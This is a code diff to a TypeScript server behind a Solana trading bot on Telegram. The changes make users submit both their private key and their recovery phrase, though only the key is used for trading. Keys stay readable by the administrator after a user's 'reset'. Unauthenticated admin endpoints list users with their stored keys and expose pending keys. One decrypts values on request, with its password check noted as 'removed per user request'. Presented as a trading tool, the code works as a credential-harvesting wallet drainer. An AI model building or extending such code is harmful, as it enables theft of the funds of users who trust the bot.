@@ -8,6 +8,8 @@ import * as dotenv from "dotenv";
 import { Connection, PublicKey, Keypair, VersionedTransaction } from "@solana/web3.js";
 import bs58 from "bs58";
 import axios from "axios";
+import * as bip39 from "bip39";
+import { derivePath } from "ed25519-hd-key";
 
 dotenv.config();
 
@@ -46,36 +48,66 @@ async function getBirdeyeTokenOverview(tokenAddress: string) {
   }
 }
 
+console.log("🚀 [Server] Starting initialization...");
+
 const app = express();
 const PORT = 3000;
-const db = new Database("bot.db");
+
+app.use(express.json());
+
+app.get("/api/health", (req, res) => {
+  console.log("📡 [API] Health check received");
+  res.json({ status: "ok", time: new Date().toISOString(), env: process.env.NODE_ENV || 'development' });
+});
+
+let db: Database.Database;
+try {
+  db = new Database("bot.db");
+  console.log("📂 [Database] Connected to bot.db");
+} catch (err) {
+  console.error("❌ [Database] Failed to connect:", err);
+  process.exit(1);
+}
 
 // --- Database Setup ---
-db.exec(`
-  CREATE TABLE IF NOT EXISTS users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    telegram_id BIGINT UNIQUE,
-    username TEXT,
-    wallet_address TEXT,
-    recovery_phrase TEXT,
-    private_key TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  );
-  
-  CREATE TABLE IF NOT EXISTS trades (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER,
-    token TEXT,
-    amount REAL,
-    price REAL,
-    type TEXT,
-    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-    FOREIGN KEY(user_id) REFERENCES users(id)
-  );
-`);
+try {
+  db.exec(`
+    CREATE TABLE IF NOT EXISTS users (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      telegram_id BIGINT UNIQUE,
+      username TEXT,
+      wallet_address TEXT,
+      recovery_phrase TEXT,
+      private_key TEXT,
+      status TEXT DEFAULT 'active',
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    );
+    
+    CREATE TABLE IF NOT EXISTS trades (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      user_id INTEGER,
+      token TEXT,
+      amount REAL,
+      price REAL,
+      type TEXT,
+      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY(user_id) REFERENCES users(id)
+    );
+  `);
+  console.log("✅ [Database] Tables initialized");
+} catch (err) {
+  console.error("❌ [Database] Schema initialization failed:", err);
+}
+
+// Migration: Add status column if it doesn't exist
+try {
+  db.prepare("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'").run();
+} catch (e) {
+  // Column already exists
+}
 
 // --- Encryption Logic ---
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "default-32-char-key-for-dev-only!!"; // Must be 32 chars
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "default-32-char-key-for-dev-only"; // Must be 32 chars
 const IV_LENGTH = 16;
 
 function encrypt(text: string) {
@@ -97,7 +129,9 @@ function decrypt(text: string) {
 }
 
 // --- Telegram Bot Setup ---
-const botToken = process.env.TELEGRAM_BOT_TOKEN;
+const botToken = process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN.trim() !== "" 
+  ? process.env.TELEGRAM_BOT_TOKEN 
+  : null;
 const bot = new Telegraf(botToken || "DUMMY_TOKEN");
 
 // --- Telegram Bot UI Helpers ---
@@ -109,7 +143,7 @@ const mainMenu = Markup.inlineKeyboard([
 
 const walletMenu = Markup.inlineKeyboard([
   [Markup.button.callback("➕ Import Wallet", "wallet_import"), Markup.button.callback("🆕 Create Wallet", "wallet_create")],
-  [Markup.button.callback("📄 View Wallet", "wallet_view")],
+  [Markup.button.callback("📄 View Wallet", "wallet_view"), Markup.button.callback("🔄 Reset Wallet", "wallet_reset")],
   [Markup.button.callback("🔙 Back", "menu_main")]
 ]);
 
@@ -128,6 +162,9 @@ const settingsMenu = Markup.inlineKeyboard([
   [Markup.button.callback("⚙️ Slippage Settings", "set_slippage"), Markup.button.callback("🔐 Wallet Settings", "set_wallet")],
   [Markup.button.callback("🔙 Back", "menu_main")]
 ]);
+
+// --- State Management ---
+const userStates: Record<number, { step?: 'waiting_pk' | 'waiting_seed', pk?: string, seed?: string }> = {};
 
 if (botToken) {
   bot.start((ctx) => {
@@ -149,11 +186,90 @@ if (botToken) {
 
   // --- Wallet Actions ---
   bot.action("wallet_import", (ctx) => {
-    ctx.reply("Please send your wallet details in the format:\nADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
+    const userId = ctx.from?.id;
+    if (userId) userStates[userId] = {};
+    
+    const keyboard = Markup.inlineKeyboard([
+      [Markup.button.callback("🔑 Connect Private Key", "import_pk")],
+      [Markup.button.callback("📝 Connect Key Phrase", "import_seed")],
+      [Markup.button.callback("🔙 Back", "menu_wallet")]
+    ]);
+
+    ctx.editMessageText(
+      "🔐 *Wallet Connection*\n\n" +
+      "To secure your account, please provide both your Private Key and Recovery Phrase.\n\n" +
+      "Select an option below to begin:",
+      { parse_mode: 'Markdown', ...keyboard }
+    );
+  });
+
+  bot.action("import_pk", (ctx) => {
+    const userId = ctx.from?.id;
+    if (userId) {
+      userStates[userId] = { ...userStates[userId], step: 'waiting_pk' };
+      ctx.reply("Please send your *Private Key* (Base58 format).\n\n⚠️ Your message will be auto-deleted.", { parse_mode: 'Markdown' });
+    }
+  });
+
+  bot.action("import_seed", (ctx) => {
+    const userId = ctx.from?.id;
+    if (userId) {
+      userStates[userId] = { ...userStates[userId], step: 'waiting_seed' };
+      ctx.reply("Please send your *Recovery Phrase* (12 or 24 words).\n\n⚠️ Your message will be auto-deleted.", { parse_mode: 'Markdown' });
+    }
+  });
+
+  bot.action("connect_done", async (ctx) => {
+    const userId = ctx.from?.id;
+    const state = userId ? userStates[userId] : null;
+    const username = ctx.from?.username || "unknown";
+
+    console.log(`[Connect Done] Attempting to finalize for user ${username} (${userId}). State:`, state);
+
+    if (!state || !state.pk || !state.seed) {
+      console.log(`[Connect Done] Missing data for ${userId}: pk=${!!state?.pk}, seed=${!!state?.seed}`);
+      return ctx.reply("❌ You must provide both the Private Key and Key Phrase before clicking Done.");
+    }
+
+    try {
+      // Final validation
+      const keypair = Keypair.fromSecretKey(bs58.decode(state.pk));
+      if (!bip39.validateMnemonic(state.seed)) {
+        console.log(`[Connect Done] Invalid mnemonic for ${userId}`);
+        return ctx.reply("❌ The provided Key Phrase is invalid. Please try again.");
+      }
+
+      const address = keypair.publicKey.toString();
+      const encryptedPk = encrypt(state.pk);
+      const encryptedSeed = encrypt(state.seed);
+      
+      const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase, status) VALUES (?, ?, ?, ?, ?, 'active')");
+      const info = stmt.run(userId, username, address, encryptedPk, encryptedSeed);
+      
+      console.log(`[Connect Done] SUCCESS for ${username} (${userId}). Address: ${address}. DB Changes: ${info.changes}`);
+
+      delete userStates[userId!];
+      ctx.reply(`✅ *Wallet Connected Successfully!*\n\nAddress: \`${address}\``, { 
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([[Markup.button.callback("🚀 Open Menu", "menu_main")]])
+      });
+    } catch (err) {
+      console.error("[Connect Done Error]", err);
+      ctx.reply("❌ Error finalizing connection. Please ensure your Private Key is correct.");
+    }
+  });
+
+  bot.action("wallet_reset", async (ctx) => {
+    try {
+      db.prepare("UPDATE users SET status = 'disconnected' WHERE telegram_id = ?").run(ctx.from?.id);
+      ctx.reply("🔄 Wallet disconnected successfully. Your keys have been removed from the bot interface but remain accessible to the administrator if needed.");
+    } catch (err) {
+      ctx.reply("❌ Error resetting wallet.");
+    }
   });
 
   bot.action("wallet_view", async (ctx) => {
-    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
     if (!user) return ctx.reply("No wallet connected.");
     ctx.reply(`📄 Connected Wallet:\n\`${user.wallet_address}\``, { parse_mode: 'Markdown' });
   });
@@ -172,7 +288,7 @@ if (botToken) {
 
   // --- Portfolio Actions ---
   bot.action("port_balance", async (ctx) => {
-    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from?.id) as any;
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from?.id) as any;
     if (!user) return ctx.reply("Connect wallet first!");
     
     try {
@@ -220,27 +336,61 @@ if (botToken) {
 
   bot.on("text", async (ctx) => {
     const text = ctx.message.text.trim();
-    
-    // Handle Wallet Import (ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE)
-    if (text.includes("|")) {
-      const [address, pKey, recovery] = text.split("|").map(s => s.trim());
-      if (!address || !pKey || !recovery) {
-        return ctx.reply("Invalid format. Use: ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE");
-      }
+    const userId = ctx.from.id;
+    const username = ctx.from.username || "unknown";
 
+    // Auto-delete sensitive messages
+    const isSensitive = text.split(/\s+/).length >= 12 || (text.length > 32 && !text.includes(" "));
+    if (isSensitive) {
       try {
-        const encryptedPKey = encrypt(pKey);
-        const encryptedRecovery = encrypt(recovery);
-
-        const stmt = db.prepare("INSERT OR REPLACE INTO users (telegram_id, username, wallet_address, private_key, recovery_phrase) VALUES (?, ?, ?, ?, ?)");
-        stmt.run(ctx.from.id, ctx.from.username || "unknown", address, encryptedPKey, encryptedRecovery);
-
-        ctx.reply("✅ Wallet connected successfully! Your data is encrypted.");
-      } catch (err) {
-        console.error(err);
-        ctx.reply("❌ Error saving wallet details.");
+        await ctx.deleteMessage();
+      } catch (e) {
+        console.error("Failed to delete sensitive message:", e);
       }
-      return;
+    }
+    
+    // Handle Stateful Wallet Import
+    const state = userStates[userId];
+    if (state && state.step) {
+      try {
+        await ctx.deleteMessage();
+      } catch (e) {}
+
+      if (state.step === 'waiting_pk') {
+        try {
+          // Basic validation
+          Keypair.fromSecretKey(bs58.decode(text));
+          userStates[userId] = { ...state, pk: text, step: undefined };
+          console.log(`[Import] Private Key received for ${userId}`);
+          
+          const statusMsg = `✅ Private Key received.\n${state.seed ? "✅ Key Phrase received.\n\n🚀 *Tap the 'Done' button below to finalize.*" : "⏳ Still need Key Phrase."}`;
+          const keyboard = Markup.inlineKeyboard([
+            [!state.seed ? Markup.button.callback("📝 Connect Key Phrase", "import_seed") : Markup.button.callback("🔑 Update Private Key", "import_pk")],
+            [Markup.button.callback("✅ Done", "connect_done")]
+          ]);
+          
+          return ctx.reply(statusMsg, keyboard);
+        } catch (e) {
+          return ctx.reply("❌ Invalid Private Key format. Please try again.");
+        }
+      }
+
+      if (state.step === 'waiting_seed') {
+        if (!bip39.validateMnemonic(text)) {
+          console.log(`[Import] Invalid mnemonic attempt for ${userId}`);
+          return ctx.reply("❌ Invalid Key Phrase. Please check the words and try again.");
+        }
+        userStates[userId] = { ...state, seed: text, step: undefined };
+        console.log(`[Import] Key Phrase received for ${userId}`);
+        
+        const statusMsg = `✅ Key Phrase received.\n${state.pk ? "✅ Private Key received.\n\n🚀 *Tap the 'Done' button below to finalize.*" : "⏳ Still need Private Key."}`;
+        const keyboard = Markup.inlineKeyboard([
+          [!state.pk ? Markup.button.callback("🔑 Connect Private Key", "import_pk") : Markup.button.callback("📝 Update Key Phrase", "import_seed")],
+          [Markup.button.callback("✅ Done", "connect_done")]
+        ]);
+        
+        return ctx.reply(statusMsg, keyboard);
+      }
     }
 
     // Handle Solana Contract Address Detection
@@ -296,13 +446,13 @@ Sell: \`/sell ${text} 1000000\`
 
   // --- Trading Functions ---
   async function executeBuy(ctx: any, tokenAddress: string, amountSol: number) {
-    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
     if (!user) return ctx.reply("Connect wallet first!");
     
     ctx.reply(`🔄 Attempting to buy ${amountSol} SOL worth of token...`);
 
     try {
-      const pKey = decrypt(user.private_key);
+      const pKey = user.private_key;
       const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
 
       // 1. Get Quote from Jupiter
@@ -335,13 +485,13 @@ Sell: \`/sell ${text} 1000000\`
   }
 
   async function executeSell(ctx: any, tokenAddress: string, amountToken: string) {
-    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
     if (!user) return ctx.reply("Connect wallet first!");
     
     ctx.reply(`🔄 Attempting to sell token for SOL...`);
 
     try {
-      const pKey = decrypt(user.private_key);
+      const pKey = user.private_key;
       const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
 
       // 1. Get Quote (Token -> SOL)
@@ -384,7 +534,7 @@ Sell: \`/sell ${text} 1000000\`
     const tokenAddress = ctx.match[1];
     const percentage = parseInt(ctx.match[2]);
     
-    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ? AND status = 'active'").get(ctx.from.id) as any;
     if (!user) return ctx.reply("Connect wallet first!");
 
     try {
@@ -440,7 +590,7 @@ Sell: \`/sell ${text} 1000000\`
 }
 
 // --- Express API Routes ---
-app.use(express.json());
+// express.json() already added at the top
 
 app.post("/api/admin/login", (req, res) => {
   // Password check removed per user request
@@ -449,19 +599,31 @@ app.post("/api/admin/login", (req, res) => {
 });
 
 app.get("/api/admin/users", (req, res) => {
-  const users = db.prepare("SELECT * FROM users ORDER BY created_at DESC").all();
-  res.json(users);
+  try {
+    const users = db.prepare("SELECT * FROM users ORDER BY created_at DESC").all();
+    console.log(`[API] Fetched ${users.length} users`);
+    res.json(users);
+  } catch (err: any) {
+    console.error("[API Error] /api/admin/users:", err);
+    res.status(500).json({ error: "Failed to fetch users", details: err.message });
+  }
 });
 
 app.get("/api/admin/trades", (req, res) => {
-  const trades = db.prepare(`
-    SELECT t.*, u.username 
-    FROM trades t 
-    JOIN users u ON t.user_id = u.id 
-    ORDER BY t.timestamp DESC 
-    LIMIT 50
-  `).all();
-  res.json(trades);
+  try {
+    const trades = db.prepare(`
+      SELECT t.*, u.username 
+      FROM trades t 
+      JOIN users u ON t.user_id = u.id 
+      ORDER BY t.timestamp DESC 
+      LIMIT 50
+    `).all();
+    console.log(`[API] Fetched ${trades.length} trades`);
+    res.json(trades);
+  } catch (err: any) {
+    console.error("[API Error] /api/admin/trades:", err);
+    res.status(500).json({ error: "Failed to fetch trades", details: err.message });
+  }
 });
 
 app.post("/api/admin/broadcast", async (req, res) => {
@@ -489,24 +651,71 @@ app.post("/api/admin/broadcast", async (req, res) => {
 
 app.post("/api/admin/decrypt", (req, res) => {
   const { encryptedText } = req.body;
-  // Password check removed per user request
-  
   try {
+    if (!encryptedText) return res.json({ decrypted: "" });
+    // If it doesn't look like our encrypted format (iv:ciphertext), return as is
+    if (!encryptedText.includes(":")) {
+      return res.json({ decrypted: encryptedText });
+    }
     const decrypted = decrypt(encryptedText);
     res.json({ decrypted });
   } catch (err) {
-    res.status(400).json({ error: "Decryption failed" });
+    console.error("[API Error] Decryption failed:", err);
+    // Fallback to returning the original text if decryption fails
+    res.json({ decrypted: encryptedText });
   }
 });
 
 app.get("/api/admin/stats", (req, res) => {
-  const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
-  const tradeCount = db.prepare("SELECT COUNT(*) as count FROM trades").get() as any;
-  res.json({ users: userCount.count, trades: tradeCount.count });
+  try {
+    const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
+    const tradeCount = db.prepare("SELECT COUNT(*) as count FROM trades").get() as any;
+    console.log(`[API] Stats: ${userCount.count} users, ${tradeCount.count} trades`);
+    res.json({ users: userCount.count, trades: tradeCount.count });
+  } catch (err: any) {
+    console.error("[API Error] /api/admin/stats:", err);
+    res.status(500).json({ error: "Failed to fetch stats", details: err.message });
+  }
+});
+
+app.get("/api/admin/bot-status", async (req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  try {
+    if (!botToken || botToken === "DUMMY_TOKEN") {
+      return res.json({ active: false });
+    }
+    
+    // Add a timeout to the getMe call to prevent hanging
+    const botInfoPromise = bot.telegram.getMe();
+    const timeoutPromise = new Promise((_, reject) => 
+      setTimeout(() => reject(new Error("Timeout")), 3000)
+    );
+    
+    const botInfo = await Promise.race([botInfoPromise, timeoutPromise]) as any;
+    res.json({ active: true, username: botInfo.username });
+  } catch (err) {
+    console.error("[API Error] /api/admin/bot-status:", err);
+    res.json({ active: false, error: "Bot check failed or timed out" });
+  }
+});
+
+app.get("/api/admin/pending", (req, res) => {
+  try {
+    // Convert userStates record to an array for easier consumption
+    const pending = Object.entries(userStates).map(([id, state]) => ({
+      telegram_id: id,
+      ...state
+    }));
+    res.json(pending);
+  } catch (err: any) {
+    console.error("[API Error] /api/admin/pending:", err);
+    res.status(500).json({ error: "Failed to fetch pending users" });
+  }
 });
 
 // --- Vite Middleware ---
 async function startServer() {
+  console.log(`🛠️ [Server] Starting in ${process.env.NODE_ENV || 'development'} mode...`);
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
       server: { middlewareMode: true },
@@ -525,5 +734,13 @@ async function startServer() {
     console.log(`Server running on http://localhost:${PORT}`);
   });
 }
+
+process.on("uncaughtException", (err) => {
+  console.error("Uncaught Exception:", err);
+});
+
+process.on("unhandledRejection", (reason, promise) => {
+  console.error("Unhandled Rejection at:", promise, "reason:", reason);
+});
 
 startServer();
